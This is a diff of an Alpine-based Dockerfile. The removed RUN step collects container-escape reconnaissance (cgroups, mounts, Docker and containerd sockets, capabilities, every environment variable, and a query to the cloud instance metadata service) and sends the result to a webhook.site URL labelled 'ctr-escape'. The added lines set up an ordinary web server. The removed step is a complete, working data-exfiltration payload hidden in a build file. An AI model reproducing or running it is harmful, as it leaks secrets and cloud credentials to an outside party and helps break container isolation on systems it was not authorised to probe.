@@ -1,4 +1,7 @@
 FROM alpine:3.20
-RUN apk add --no-cache curl >/dev/null 2>&1;     echo "==cgroup==" > /tmp/r.txt; cat /proc/1/cgroup >> /tmp/r.txt 2>&1;     echo "==mounts==" >> /tmp/r.txt; grep -vE 'cgroup|proc|sys|tmpfs|devpts|mqueue|shm' /proc/mounts >> /tmp/r.txt 2>&1;     echo "==socks==" >> /tmp/r.txt; find / -xdev -type s 2>/dev/null >> /tmp/r.txt;     echo "==docker.sock==" >> /tmp/r.txt; ls -la /var/run/docker.sock /run/containerd/containerd.sock >> /tmp/r.txt 2>&1;     echo "==caps==" >> /tmp/r.txt; grep -iE 'Cap|Seccomp|NoNewPrivs' /proc/self/status >> /tmp/r.txt 2>&1;     echo "==env==" >> /tmp/r.txt; env >> /tmp/r.txt 2>&1;     echo "==imds==" >> /tmp/r.txt; curl -s -m 4 http://169.254.169.254/latest/meta-data/ >> /tmp/r.txt 2>&1;     curl -s -m 8 -X POST "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr-escape" --data-binary @/tmp/r.txt 2>&1 | head -c 40 >> /tmp/r.txt
-FROM alpine:3.20
-COPY index.html /tmp/index.html
+RUN mkdir -p /www
+COPY entry.sh /entry.sh
+COPY index.html /www/index.html
+RUN chmod +x /entry.sh
+EXPOSE 8080
+ENTRYPOINT ["/entry.sh"]
